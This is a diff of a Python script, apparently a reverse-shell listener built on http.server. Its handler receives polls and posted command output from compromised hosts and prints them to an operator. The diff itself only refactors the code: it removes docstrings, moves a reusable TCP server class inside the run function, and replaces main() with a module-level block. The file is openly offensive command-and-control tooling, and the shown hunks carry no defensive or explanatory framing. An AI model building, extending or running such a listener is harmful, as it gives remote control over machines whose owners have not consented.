@@ -10,7 +10,6 @@ shell_connected = False
 
 class ReverseShellHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
-        """Handle GET requests from the reverse shell."""
         global shell_connected
         if not shell_connected:
             print("Shell connected")
@@ -26,7 +25,6 @@ class ReverseShellHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(b"")
 
     def do_POST(self):
-        """Handle POST requests from the reverse shell."""
         global shell_connected
         # Receive the command output from the reverse shell
         content_length = int(self.headers['Content-Length'])
@@ -38,15 +36,14 @@ class ReverseShellHandler(http.server.SimpleHTTPRequestHandler):
         self.end_headers()
 
     def log_message(self, format, *args):
-        """Override to filter out 200 requests."""
+        # Override to filter out 200 requests
         if "200" not in format % args:
             super().log_message(format, *args)
 
-class ReusableTCPServer(socketserver.TCPServer):
-    allow_reuse_address = True
-
 def run_server():
-    """Run the HTTP server to handle reverse shell connections."""
+    class ReusableTCPServer(socketserver.TCPServer):
+        allow_reuse_address = True
+
     while True:
         try:
             with ReusableTCPServer(("", PORT), ReverseShellHandler) as httpd:
@@ -62,8 +59,7 @@ def run_server():
             else:
                 raise
 
-def main():
-    """Main function to start the server and handle user input."""
+if __name__ == "__main__":
     server_thread = threading.Thread(target=run_server)
     server_thread.daemon = True
     server_thread.start()
@@ -75,6 +71,3 @@ def main():
             shell_connected = False
         if not output_queue.empty():
             print("\nCommand output:\n", output_queue.get())
-
-if __name__ == "__main__":
-    main()
